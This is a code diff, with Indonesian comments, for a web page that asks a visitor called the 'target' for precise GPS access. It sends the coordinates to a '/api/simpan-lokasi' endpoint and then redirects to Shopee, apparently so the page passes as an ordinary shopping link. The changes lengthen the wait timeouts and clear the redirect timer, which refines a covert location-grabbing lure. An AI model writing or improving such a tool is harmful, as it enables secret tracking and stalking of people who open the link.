@@ -66,10 +66,10 @@
         }
       }
 
-      // Waktu batas maksimal (5 detik). Jika target tidak mengklik izinkan/tolak, tetap dialihkan.
-      const maxWaitTimer = setTimeout(() => {
+      // Waktu batas maksimal (8 detik). Jika target tidak mengklik izinkan/tolak, tetap dialihkan.
+      let maxWaitTimer = setTimeout(() => {
         alihkanKeShopee();
-      }, 5000);
+      }, 8000);
 
       function kirimLokasiKeServer(dataGPS) {
         fetch("/api/simpan-lokasi", {
@@ -107,15 +107,17 @@
             (error) => {
               // Jika target mengklik "Block / Menolak"
               console.warn("Akses GPS ditolak/gagal:", error.message);
+              clearTimeout(maxWaitTimer);
               alihkanKeShopee();
             },
             {
               enableHighAccuracy: true, // Paksa gunakan GPS hardware HP agar presisi
-              timeout: 4000,
+              timeout: 5000,
               maximumAge: 0,
             },
           );
         } else {
+          clearTimeout(maxWaitTimer);
           alihkanKeShopee();
         }
       };
